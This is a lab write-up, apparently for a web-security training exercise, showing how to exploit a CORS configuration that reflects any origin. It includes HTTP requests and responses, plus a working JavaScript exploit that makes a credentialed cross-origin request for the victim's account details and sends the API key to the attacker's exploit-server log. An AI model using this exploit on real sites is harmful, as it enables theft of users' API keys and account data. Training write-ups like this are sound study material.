This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

Login with wiener:peter

Observe GET /accountDetails request

```http
GET /accountDetails HTTP/2
Host: 0ae200b404787403816fd90e00d600d5.web-security-academy.net
...
```

response
```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "ECAUAxXBHOgyn25gqKc57MDySXM1h7Y4",
  "sessions": [
    "hYmgDlci67bxvYyRwGg4FxpVphEZDd8c"
  ]
}
```

Add Origin header into request

```http
GET /accountDetails HTTP/2
Host: 0ae200b404787403816fd90e00d600d5.web-security-academy.net
Origin: example.com
...
```

response
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
...
```

Origin is being reflected in response Access-Control-Allow-Origin header.

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin

Store exploit in exploit server:

```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://0ae200b404787403816fd90e00d600d5.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```

Deliver exploit to victim and view access logs to get the response of the cross origin request to LAB/accountDetails
- submit API key from access log
